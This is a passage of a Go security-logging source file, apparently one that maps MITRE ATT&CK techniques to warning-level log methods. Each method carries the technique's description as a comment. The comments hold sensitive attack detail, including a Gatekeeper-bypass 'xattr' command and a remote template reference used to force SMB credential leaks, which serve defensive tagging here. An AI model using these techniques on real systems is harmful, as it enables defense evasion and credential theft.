Adversaries may exfiltrate data to a cloud storage service rather than over
their primary command and control channel. Cloud storage services allow for the
storage, edit, and retrieval of data from a remote cloud storage server over the
Internet. Examples of cloud storage services include Dropbox and Google Docs.
Exfiltration to these cloud storage services can provide a significant amount of
cover to the adversary if hosts within the network are already communicating
with the service.
*/
func (g *Session) ATTACKEntExfiltrationtoCloudStorage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1567.002").
        Msg("exfiltration to cloud storage")
}

/* ATTACKEntExfiltrationtoCodeRepository Phases: exfiltration

Adversaries may exfiltrate data to a code repository rather than over their
primary command and control channel. Code repositories are often accessible via
an API (ex: https://api.github.com). Access to these APIs are often over HTTPS,
which gives the adversary an additional level of protection. Exfiltration to a
code repository can also provide a significant amount of cover to the adversary
if it is a popular service already used by hosts within the network.
*/
func (g *Session) ATTACKEntExfiltrationtoCodeRepository(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1567.001").
        Msg("exfiltration to code repository")
}

/* ATTACKEntExploitPublicFacingApplication Phases: initial-access

Adversaries may attempt to take advantage of a weakness in an Internet-facing
computer or program using software, data, or commands in order to cause
unintended or unanticipated behavior. The weakness in the system can be a bug, a
glitch, or a design vulnerability. These applications are often websites, but
can include databases (like SQL)(Citation: NVD CVE-2016-6662), standard services
(like SMB(Citation: CIS Multiple SMB Vulnerabilities) or SSH), network device
administration and management protocols (like SNMP and Smart Install(Citation:
US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog
Legacy Device Attacks)), and any other applications with Internet accessible
open sockets, such as web servers and related services.(Citation: NVD
CVE-2014-7169) Depending on the flaw being exploited this may include
Exploitation for Defense Evasion.  If an application is hosted on cloud-based
infrastructure and/or is containerized, then exploiting it may lead to
compromise of the underlying instance or container. This can allow an adversary
a path to access the cloud or container APIs, exploit container host access via
Escape to Host, or take advantage of weak identity and access management
policies. For websites and databases, the OWASP top 10 and CWE top 25 highlight
the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE
top 25)
*/
func (g *Session) ATTACKEntExploitPublicFacingApplication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1190").
        Msg("exploit public-facing application")
}

/* ATTACKEntExploitationforClientExecution Phases: execution

Adversaries may exploit software vulnerabilities in client applications to
execute code. Vulnerabilities can exist in software due to unsecure coding
practices that can lead to unanticipated behavior. Adversaries can take
advantage of certain vulnerabilities through targeted exploitation for the
purpose of arbitrary code execution. Oftentimes the most valuable exploits to an
offensive toolkit are those that can be used to obtain code execution on a
remote system because they can be used to gain access to that system. Users will
expect to see files related to the applications they commonly used to do work,
so they are a useful target for exploit research and development because of
their high utility. Several types exist: Browser-based Exploitation Web browsers
are a common target through Drive-by Compromise and Spearphishing Link. Endpoint
systems may be compromised through normal web browsing or from certain users
being targeted by links in spearphishing emails to adversary controlled sites
used to exploit the web browser. These often do not require an action by the
user for the exploit to be executed. Office Applications Common office and
productivity applications such as Microsoft Office are also targeted through
Phishing. Malicious files will be transmitted directly as attachments or through
links to download them. These require the user to open the document or file for
the exploit to run. Common Third-party Applications Other applications that are
commonly seen or are part of the software deployed in a target network may also
be used for exploitation. Applications such as Adobe Reader and Flash, which are
common in enterprise environments, have been routinely targeted by adversaries
attempting to gain access to systems. Depending on the software and nature of
the vulnerability, some may be exploited in the browser or require the user to
open a file. For instance, some Flash exploits have been delivered as objects
within Microsoft Office documents.
*/
func (g *Session) ATTACKEntExploitationforClientExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1203").
        Msg("exploitation for client execution")
}

/* ATTACKEntExploitationforCredentialAccess Phases: credential-access

Adversaries may exploit software vulnerabilities in an attempt to collect
credentials. Exploitation of a software vulnerability occurs when an adversary
takes advantage of a programming error in a program, service, or within the
operating system software or kernel itself to execute adversary-controlled
code. Credentialing and authentication mechanisms may be targeted for
exploitation by adversaries as a means to gain access to useful credentials or
circumvent the process to gain access to systems. One example of this is
MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using
domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity
Detecting Forged Tickets) Exploitation for credential access may also result in
Privilege Escalation depending on the process targeted or credentials obtained.
*/
func (g *Session) ATTACKEntExploitationforCredentialAccess(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1212").
        Msg("exploitation for credential access")
}

/* ATTACKEntExploitationforDefenseEvasion Phases: defense-evasion

Adversaries may exploit a system or application vulnerability to bypass security
features. Exploitation of a software vulnerability occurs when an adversary
takes advantage of a programming error in a program, service, or within the
operating system software or kernel itself to execute adversary-controlled
code. Vulnerabilities may exist in defensive security software that can be used
to disable or circumvent them. Adversaries may have prior knowledge through
reconnaissance that security software exists within an environment or they may
perform checks during or shortly after the system is compromised for Security
Software Discovery. The security software will likely be targeted directly for
exploitation. There are examples of antivirus software being targeted by
persistent threat groups to avoid detection.
*/
func (g *Session) ATTACKEntExploitationforDefenseEvasion(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1211").
        Msg("exploitation for defense evasion")
}

/* ATTACKEntExploitationforPrivilegeEscalation Phases: privilege-escalation

Adversaries may exploit software vulnerabilities in an attempt to elevate
privileges. Exploitation of a software vulnerability occurs when an adversary
takes advantage of a programming error in a program, service, or within the
operating system software or kernel itself to execute adversary-controlled code.
Security constructs such as permission levels will often hinder access to
information and use of certain techniques, so adversaries will likely need to
perform privilege escalation to include use of software exploitation to
circumvent those restrictions. When initially gaining access to a system, an
adversary may be operating within a lower privileged process which will prevent
them from accessing certain resources on the system. Vulnerabilities may exist,
usually in operating system components and software commonly running at higher
permissions, that can be exploited to gain higher levels of access on the
system. This could enable someone to move from unprivileged or user level
permissions to SYSTEM or root permissions depending on the component that is
vulnerable. This could also enable an adversary to move from a virtualized
environment, such as within a virtual machine or container, onto the underlying
host. This may be a necessary step for an adversary compromising an endpoint
system that has been properly configured and limits other privilege escalation
methods. Adversaries may bring a signed vulnerable driver onto a compromised
machine so that they can exploit the vulnerability to execute code in kernel
mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver
(BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June
2020) Adversaries may include the vulnerable driver with files delivered during
Initial Access or download it to a compromised system via Ingress Tool Transfer
or Lateral Tool Transfer.
*/
func (g *Session) ATTACKEntExploitationforPrivilegeEscalation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1068").
        Msg("exploitation for privilege escalation")
}

/* ATTACKEntExploitationofRemoteServices Phases: lateral-movement

Adversaries may exploit remote services to gain unauthorized access to internal
systems once inside of a network. Exploitation of a software vulnerability
occurs when an adversary takes advantage of a programming error in a program,
service, or within the operating system software or kernel itself to execute
adversary-controlled code. A common goal for post-compromise exploitation of
remote services is for lateral movement to enable access to a remote system. An
adversary may need to determine if the remote system is in a vulnerable state,
which may be done through Network Service Scanning or other Discovery methods
looking for common, vulnerable software that may be deployed in the network, the
lack of certain patches that may indicate vulnerabilities,  or security software
that may be used to detect or contain remote exploitation. Servers are likely a
high value target for lateral movement exploitation, but endpoint systems may
also be at risk if they provide an advantage or access to additional resources.
There are several well-known vulnerabilities that exist in common services such
as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD
CVE-2017-0176) as well as applications that may be used within internal networks
such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation:
NVD CVE-2014-7169) Depending on the permissions level of the vulnerable remote
service an adversary may achieve Exploitation for Privilege Escalation as a
result of lateral movement exploitation as well.
*/
func (g *Session) ATTACKEntExploitationofRemoteServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1210").
        Msg("exploitation of remote services")
}

/* ATTACKEntExploits Phases: resource-development

Adversaries may develop exploits that can be used during targeting. An exploit
takes advantage of a bug or vulnerability in order to cause unintended or
unanticipated behavior to occur on computer hardware or software. Rather than
finding/modifying exploits from online or purchasing them from exploit vendors,
an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries
may use information acquired via Vulnerabilities to focus exploit development
efforts. As part of the exploit development process, adversaries may uncover
exploitable vulnerabilities through methods such as fuzzing and patch
analysis.(Citation: Irongeek Sims BSides 2017) As with legitimate development
efforts, different skill sets may be required for developing exploits. The
skills needed may be located in-house, or may need to be contracted out. Use of
a contractor may be considered an extension of that adversary's exploit
development capabilities, provided the adversary plays a role in shaping
requirements and maintains an initial degree of exclusivity to the exploit.
Adversaries may use exploits during various phases of the adversary lifecycle
(i.e. Exploit Public-Facing Application, Exploitation for Client Execution,
Exploitation for Privilege Escalation, Exploitation for Defense Evasion,
Exploitation for Credential Access, Exploitation of Remote Services, and
Application or System Exploitation).
*/
func (g *Session) ATTACKEntExploits(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1587.004").
        Msg("exploits")
}

/* ATTACKEntExploits2 Phases: resource-development

Adversaries may buy, steal, or download exploits that can be used during
targeting. An exploit takes advantage of a bug or vulnerability in order to
cause unintended or unanticipated behavior to occur on computer hardware or
software. Rather than developing their own exploits, an adversary may
find/modify exploits from online or purchase them from exploit
vendors.(Citation: Exploit Database)(Citation: TempertonDarkHotel)(Citation:
NationsBuying) In addition to downloading free exploits from the internet,
adversaries may purchase exploits from third-party entities. Third-party
entities can include technology companies that specialize in exploit
development, criminal marketplaces (including exploit kits), or from
individuals.(Citation: PegasusCitizenLab)(Citation: Wired SandCat Oct 2019) In
addition to purchasing exploits, adversaries may steal and repurpose exploits
from third-party entities (including other adversaries).(Citation:
TempertonDarkHotel) An adversary may monitor exploit provider forums to
understand the state of existing, as well as newly discovered, exploits. There
is usually a delay between when an exploit is discovered and when it is made
public. An adversary may target the systems of those known to conduct exploit
research and development in order to gain that knowledge for use during a
subsequent operation. Adversaries may use exploits during various phases of the
adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for
Client Execution, Exploitation for Privilege Escalation, Exploitation for
Defense Evasion, Exploitation for Credential Access, Exploitation of Remote
Services, and Application or System Exploitation).
*/
func (g *Session) ATTACKEntExploits2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588.005").
        Msg("exploits")
}

/* ATTACKEntExternalDefacement Phases: impact

An adversary may deface systems external to an organization in an attempt to
deliver messaging, intimidate, or otherwise mislead an organization or users.
Externally-facing websites are a common victim of defacement; often targeted by
adversary and hacktivist groups in order to push a political message or spread
propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin
Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous
Hackers Deface Russian Govt Site) External Defacement may be used as a catalyst
to trigger events, or as a response to actions taken by an organization or
government. Similarly, website defacement may also be used as setup, or a
precursor, for future attacks such as Drive-by Compromise.(Citation: Trend Micro
Deep Dive Into Defacement)
*/
func (g *Session) ATTACKEntExternalDefacement(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1491.002").
        Msg("external defacement")
}

/* ATTACKEntExternalProxy Phases: command-and-control

Adversaries may use an external proxy to act as an intermediary for network
communications to a command and control server to avoid direct connections to
their infrastructure. Many tools exist that enable traffic redirection through
proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. (Citation:
Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage
command and control communications, to provide resiliency in the face of
connection loss, or to ride over existing trusted communications paths to avoid
suspicion. External connection proxies are used to mask the destination of C2
traffic and are typically implemented with port redirectors. Compromised systems
outside of the victim environment may be used for these purposes, as well as
purchased infrastructure such as cloud-based resources or virtual private
servers. Proxies may be chosen based on the low likelihood that a connection to
them from a compromised system would be investigated. Victim systems would
communicate directly with the external proxy on the Internet and then the proxy
would forward communications to the C2 server.
*/
func (g *Session) ATTACKEntExternalProxy(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1090.002").
        Msg("external proxy")
}

/* ATTACKEntExternalRemoteServices Phases: persistence initial-access

Adversaries may leverage external-facing remote services to initially access
and/or persist within a network. Remote services such as VPNs, Citrix, and other
access mechanisms allow users to connect to internal enterprise network
resources from external locations. There are often remote service gateways that
manage connections and credential authentication for these services. Services
such as Windows Remote Management can also be used externally. Access to Valid
Accounts to use the service is often a requirement, which could be obtained
through credential pharming or by obtaining the credentials from users after
compromising the enterprise network.(Citation: Volexity Virtual Private
Keylogging) Access to remote services may be used as a redundant or persistent
access mechanism during an operation. Access may also be gained through an
exposed service that doesn’t require authentication. In containerized
environments, this may include an exposed Docker API, Kubernetes API server,
kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend
Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)
*/
func (g *Session) ATTACKEntExternalRemoteServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1133").
        Msg("external remote services")
}

/* ATTACKEntExtraWindowMemoryInjection Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into process via Extra Window Memory (EWM)
in order to evade process-based defenses as well as possibly elevate privileges.
EWM injection is a method of executing arbitrary code in the address space of a
separate live process.  Before creating a window, graphical Windows-based
processes must prescribe to or register a windows class, which stipulate
appearance and behavior (via windows procedures, which are functions that handle
input/output of data).(Citation: Microsoft Window Classes) Registration of new
windows classes can include a request for up to 40 bytes of EWM to be appended
to the allocated memory of each instance of that class. This EWM is intended to
store data specific to that window and has specific application programming
interface (API) functions to set and get its value. (Citation: Microsoft
GetWindowLong function) (Citation: Microsoft SetWindowLong function) Although
small, the EWM is large enough to store a 32-bit pointer and is often used to
point to a windows procedure. Malware may possibly utilize this memory location
in part of an attack chain that includes writing code to shared sections of the
process’s memory, placing a pointer to the code in EWM, then invoking execution
by returning execution control to the address in the process’s EWM. Execution
granted through EWM injection may allow access to both the target process's
memory and possibly elevated privileges. Writing payloads to shared sections
also avoids the use of highly monitored API calls such as WriteProcessMemory and
CreateRemoteThread.(Citation: Elastic Process Injection July 2017) More
sophisticated malware samples may also potentially bypass protection mechanisms
such as data execution prevention (DEP) by triggering a combination of windows
procedures and other system functions that will rewrite the malicious payload
inside an executable portion of the target process.  (Citation: MalwareTech
Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)
Running code in the context of another process may allow access to the process's
memory, system/network resources, and possibly elevated privileges. Execution
via EWM injection may also evade detection from security products since the
execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntExtraWindowMemoryInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.011").
        Msg("extra window memory injection")
}

/* ATTACKEntFallbackChannels Phases: command-and-control

Adversaries may use fallback or alternate communication channels if the primary
channel is compromised or inaccessible in order to maintain reliable command and
control and to avoid data transfer thresholds.
*/
func (g *Session) ATTACKEntFallbackChannels(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1008").
        Msg("fallback channels")
}

/* ATTACKEntFastFluxDNS Phases: command-and-control

Adversaries may use Fast Flux DNS to hide a command and control channel behind
an array of rapidly changing IP addresses linked to a single domain resolution.
This technique uses a fully qualified domain name, with multiple IP addresses
assigned to it which are swapped with high frequency, using a combination of
round robin IP addressing and short Time-To-Live (TTL) for a DNS resource
record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast
Flux - Welivesecurity) The simplest, "single-flux" method, involves registering
and de-registering an addresses as part of the DNS A (address) record list for a
single DNS name. These registrations have a five-minute average lifespan,
resulting in a constant shuffle of IP address resolution.(Citation: Fast Flux -
Welivesecurity) In contrast, the "double-flux" method registers and de-registers
an address as part of the DNS Name Server record list for the DNS zone,
providing additional resilience for the connection. With double-flux additional
hosts can act as a proxy to the C2 host, further insulating the true source of
the C2 channel.
*/
func (g *Session) ATTACKEntFastFluxDNS(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1568.001").
        Msg("fast flux dns")
}

/* ATTACKEntFileDeletion Phases: defense-evasion

Adversaries may delete files left behind by the actions of their intrusion
activity. Malware, tools, or other non-native files dropped or created on a
system by an adversary may leave traces to indicate to what was done within a
network and how. Removal of these files can occur during an intrusion, or as
part of a post-intrusion process to minimize the adversary's footprint. There
are tools available from the host operating system to perform cleanup, but
adversaries may use other tools as well. Examples include native cmd functions
such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or
other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)
*/
func (g *Session) ATTACKEntFileDeletion(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070.004").
        Msg("file deletion")
}

/* ATTACKEntFileTransferProtocols Phases: command-and-control

Adversaries may communicate using application layer protocols associated with
transferring files to avoid detection/network filtering by blending in with
existing traffic. Commands to the remote system, and often the results of those
commands, will be embedded within the protocol traffic between the client and
server.  Protocols such as FTP, FTPS, and TFTP that transfer files may be very
common in environments.  Packets produced from these protocols may have many
fields and headers in which data can be concealed. Data could also be concealed
within the transferred files. An adversary may abuse these protocols to
communicate with systems under their control within a victim network while also
mimicking normal, expected traffic.
*/
func (g *Session) ATTACKEntFileTransferProtocols(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1071.002").
        Msg("file transfer protocols")
}

/* ATTACKEntFileandDirectoryDiscovery Phases: discovery

Adversaries may enumerate files and directories or may search in specific
locations of a host or network share for certain information within a file
system. Adversaries may use the information from File and Directory Discovery
during automated discovery to shape follow-on behaviors, including whether or
not the adversary fully infects the target and/or attempts specific actions.
Many command shell utilities can be used to obtain this information. Examples
include dir, tree, ls, find, and locate. (Citation: Windows Commands JPCERT)
Custom tools may also be used to gather file and directory information and
interact with the Native API.
*/
func (g *Session) ATTACKEntFileandDirectoryDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1083").
        Msg("file and directory discovery")
}

/* ATTACKEntFileandDirectoryPermissionsModification Phases: defense-evasion

Adversaries may modify file or directory permissions/attributes to evade access
control lists (ACLs) and access protected files.(Citation: Hybrid Analysis
Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and
directory permissions are commonly managed by ACLs configured by the file or
directory owner, or users with the appropriate permissions. File and directory
ACL implementations vary by platform, but generally explicitly designate which
users or groups can perform which actions (read, write, execute, etc.).
Modifications may include changing specific access rights, which may require
taking ownership of a file or directory and/or elevated permissions depending on
the file or directory’s existing permissions. This may enable malicious activity
such as modifying, replacing, or deleting specific files or directories.
Specific file and directory modifications may be a required step for many
techniques, such as establishing Persistence via Accessibility Features, Boot or
Logon Initialization Scripts, Unix Shell Configuration Modification, or
tainting/hijacking other instrumental binary/configuration files via Hijack
Execution Flow.
*/
func (g *Session) ATTACKEntFileandDirectoryPermissionsModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1222").
        Msg("file and directory permissions modification")
}

/* ATTACKEntFirmware Phases: reconnaissance

Adversaries may gather information about the victim's host firmware that can be
used during targeting. Information about host firmware may include a variety of
details such as type and versions on specific hosts, which may be used to infer
more information about hosts in the environment (ex: configuration, purpose,
age/patch level, etc.). Adversaries may gather this information in various ways,
such as direct elicitation via Phishing for Information. Information about host
firmware may only be exposed to adversaries via online or other accessible data
sets (ex: job postings, network maps, assessment reports, resumes, or purchase
invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal
opportunities for other forms of reconnaissance (ex: Search Open
Websites/Domains or Search Open Technical Databases), establishing operational
resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial
access (ex: Supply Chain Compromise or Exploit Public-Facing Application).
*/
func (g *Session) ATTACKEntFirmware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1592.003").
        Msg("firmware")
}

/* ATTACKEntFirmwareCorruption Phases: impact

Adversaries may overwrite or corrupt the flash memory contents of system BIOS or
other firmware in devices attached to a system in order to render them
inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is
software that is loaded and executed from non-volatile memory on hardware
devices in order to initialize and manage device functionality. These devices
could include the motherboard, hard drive, or video cards.
*/
func (g *Session) ATTACKEntFirmwareCorruption(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1495").
        Msg("firmware corruption")
}

/* ATTACKEntForcedAuthentication Phases: credential-access

Adversaries may gather credential material by invoking or forcing a user to
automatically provide authentication information through a mechanism in which
they can intercept. The Server Message Block (SMB) protocol is commonly used in
Windows networks for authentication and communication between systems for access
to resources and file sharing. When a Windows system attempts to connect to an
SMB resource it will automatically attempt to authenticate and send credential
information for the current user to the remote system. (Citation: Wikipedia
Server Message Block) This behavior is typical in enterprise environments so
that users do not need to enter credentials to access network resources. Web
Distributed Authoring and Versioning (WebDAV) is also typically used by Windows
systems as a backup protocol when SMB is blocked or fails. WebDAV is an
extension of HTTP and will typically operate over TCP ports 80 and 443.
(Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV
Security) Adversaries may take advantage of this behavior to gain access to user
account hashes through forced SMB/WebDAV authentication. An adversary can send
an attachment to a user through spearphishing that contains a resource link to
an external server controlled by the adversary (i.e. Template Injection), or
place a specially crafted file on navigation path for privileged accounts (e.g.
.SCF file placed on desktop) or on a publicly accessible share to be accessed by
victim(s). When the user's system accesses the untrusted resource it will
attempt authentication and send information, including the user's hashed
credentials, over SMB to the adversary controlled server. (Citation: GitHub
Hashjacking) With access to the credential hash, an adversary can perform off-
line Brute Force cracking to gain access to plaintext credentials. (Citation:
Cylance Redirect to SMB) There are several different ways this can occur.
(Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use
include:  A spearphishing attachment containing a document with a resource that
is automatically loaded when the document is opened (i.e. Template Injection).
The document can include, for example, a request similar to file[:]//[remote
address]/Normal.dotm to trigger the SMB request. (Citation: US-CERT APT Energy
Oct 2017) A modified .LNK or .SCF file with the icon filename pointing to an
external reference such as \[remote address]\pic.png that will force the system
to load the resource when the icon is rendered to repeatedly gather credentials.
(Citation: US-CERT APT Energy Oct 2017)
*/
func (g *Session) ATTACKEntForcedAuthentication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1187").
        Msg("forced authentication")
}

/* ATTACKEntForgeWebCredentials Phases: credential-access

Adversaries may forge credential materials that can be used to gain access to
web applications or Internet services. Web applications and services (hosted in
cloud SaaS environments or on-premise servers) often use session cookies,
tokens, or other materials to authenticate and authorize user access.
Adversaries may generate these credential materials in order to gain access to
web resources. This differs from Steal Web Session Cookie, Steal Application
Access Token, and other similar behaviors in that the credentials are new and
forged by the adversary, rather than stolen or intercepted from legitimate
users. The generation of web credentials often requires secret values, such as
passwords, Private Keys, or other cryptographic seed values.(Citation: GitHub
AWS-ADFS-Credential-Generator) Once forged, adversaries may use these web
credentials to access resources (ex: Use Alternate Authentication Material),
which may bypass multi-factor and other authentication protection
mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies
January 2019)(Citation: Microsoft SolarWinds Customer Guidance)
*/
func (g *Session) ATTACKEntForgeWebCredentials(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1606").
        Msg("forge web credentials")
}

/* ATTACKEntGUIInputCapture Phases: collection credential-access

Adversaries may mimic common operating system GUI components to prompt users for
credentials with a seemingly legitimate prompt. When programs are executed that
need additional privileges than are present in the current user context, it is
common for the operating system to prompt the user for proper credentials to
authorize the elevated privileges for the task (ex: Bypass User Account
Control). Adversaries may mimic this functionality to prompt users for
credentials with a seemingly legitimate prompt for a number of reasons that
mimic normal usage, such as a fake installer requiring additional access or a
fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type
of prompt can be used to collect credentials via various languages such as
AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap
malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation:
Enigma Phishing for Credentials Jan 2015).
*/
func (g *Session) ATTACKEntGUIInputCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1056.002").
        Msg("gui input capture")
}

/* ATTACKEntGatekeeperBypass Phases: defense-evasion

Adversaries may modify file attributes that signify programs are from untrusted
sources to subvert Gatekeeper controls. In macOS and OS X, when applications or
programs are downloaded from the internet, there is a special attribute set on
the file called com.apple.quarantine. This attribute is read by Apple's
Gatekeeper defense program at execution time and provides a prompt to the user
to allow or deny execution.  Apps loaded onto the system from USB flash drive,
optical disk, external hard drive, or even from a drive shared over the local
network won’t set this flag. Additionally, it is possible to avoid setting this
flag using Drive-by Compromise. This completely bypasses the built-in Gatekeeper
check. (Citation: Methods of Mac Malware Persistence) The presence of the
quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for
com.apple.quarantine. Similarly, given sudo access or elevated permission, this
attribute can be removed with xattr as well, sudo xattr -r -d
com.apple.quarantine /path/to/MyApp.app. (Citation: Clearing quarantine
attribute) (Citation: OceanLotus for OS X) In typical operation, a file will be
downloaded from the internet and given a quarantine flag before being saved to
disk. When the user tries to open the file or application, macOS’s gatekeeper
will step in and check for the presence of this flag. If it exists, then macOS
will then prompt the user to confirmation that they want to run the program and
will even provide the URL where the application came from. However, this is all
based on the file being downloaded from a quarantine-savvy application.
(Citation: Bypassing Gatekeeper)
*/
func (g *Session) ATTACKEntGatekeeperBypass(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1553.001").
        Msg("gatekeeper bypass")
}

/* ATTACKEntGatherVictimHostInformation Phases: reconnaissance

Adversaries may gather information about the victim's hosts that can be used
during targeting. Information about hosts may include a variety of details,
including administrative data (ex: name, assigned IP, functionality, etc.) as
well as specifics regarding its configuration (ex: operating system, language,
etc.). Adversaries may gather this information in various ways, such as direct
collection actions via Active Scanning or Phishing for Information. Adversaries
may also compromise sites then include malicious content designed to collect
host information from visitors.(Citation: ATT ScanBox) Information about hosts
may also be exposed to adversaries via online or other accessible data sets (ex:
Social Media or Search Victim-Owned Websites). Gathering this information may
reveal opportunities for other forms of reconnaissance (ex: Search Open
Websites/Domains or Search Open Technical Databases), establishing operational
resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial
access (ex: Supply Chain Compromise or External Remote Services).
*/
func (g *Session) ATTACKEntGatherVictimHostInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1592").
        Msg("gather victim host information")
}

/* ATTACKEntGatherVictimIdentityInformation Phases: reconnaissance

Adversaries may gather information about the victim's identity that can be used
during targeting. Information about identities may include a variety of details,
including personal data (ex: employee names, email addresses, etc.) as well as
sensitive details such as credentials. Adversaries may gather this information
in various ways, such as direct elicitation via Phishing for Information.
Information about victims may also be exposed to adversaries via online or other
accessible data sets (ex: Social Media or Search Victim-Owned
Websites).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register
Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation:
GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Gathering this
information may reveal opportunities for other forms of reconnaissance (ex:
Search Open Websites/Domains or Phishing for Information), establishing
operational resources (ex: Compromise Accounts), and/or initial access (ex:
Phishing or Valid Accounts).
*/
func (g *Session) ATTACKEntGatherVictimIdentityInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1589").
        Msg("gather victim identity information")
}

/* ATTACKEntGatherVictimNetworkInformation Phases: reconnaissance

Adversaries may gather information about the victim's networks that can be used
during targeting. Information about networks may include a variety of details,
including administrative data (ex: IP ranges, domain names, etc.) as well as
specifics regarding its topology and operations. Adversaries may gather this
information in various ways, such as direct collection actions via Active
Scanning or Phishing for Information. Information about networks may also be
exposed to adversaries via online or other accessible data sets (ex: Search Open
Technical Databases).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl
Passive DNS) Gathering this information may reveal opportunities for other forms
of reconnaissance (ex: Active Scanning or Search Open Websites/Domains),
establishing operational resources (ex: Acquire Infrastructure or Compromise
Infrastructure), and/or initial access (ex: Trusted Relationship).
*/
func (g *Session) ATTACKEntGatherVictimNetworkInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1590").
        Msg("gather victim network information")
}

/* ATTACKEntGatherVictimOrgInformation Phases: reconnaissance

Adversaries may gather information about the victim's organization that can be
used during targeting. Information about an organization may include a variety
of details, including the names of divisions/departments, specifics of business
operations, as well as the roles and responsibilities of key employees.
Adversaries may gather this information in various ways, such as direct
elicitation via Phishing for Information. Information about an organization may
also be exposed to adversaries via online or other accessible data sets (ex:
Social Media or Search Victim-Owned Websites).(Citation: ThreatPost Broadvoice
Leak)(Citation: DOB Business Lookup) Gathering this information may reveal
opportunities for other forms of reconnaissance (ex: Phishing for Information or
Search Open Websites/Domains), establishing operational resources (ex: Establish
Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted
Relationship).
*/
func (g *Session) ATTACKEntGatherVictimOrgInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1591").
        Msg("gather victim org information")
}

/* ATTACKEntGoldenTicket Phases: credential-access

Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-
granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity
Kerberos GT Aug 2015) Golden tickets enable adversaries to generate
authentication material for any account in Active Directory.(Citation: CERT-EU
Golden Ticket Protection)  Using a golden ticket, adversaries are then able to
request ticket granting service (TGS) tickets, which enable access to specific
resources. Golden tickets require adversaries to interact with the Key
Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting
Forged Tickets) The KDC service runs all on domain controllers that are part of
an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC)
service account and is responsible for encrypting and signing all Kerberos
tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may
be obtained using OS Credential Dumping and privileged access to a domain
controller.
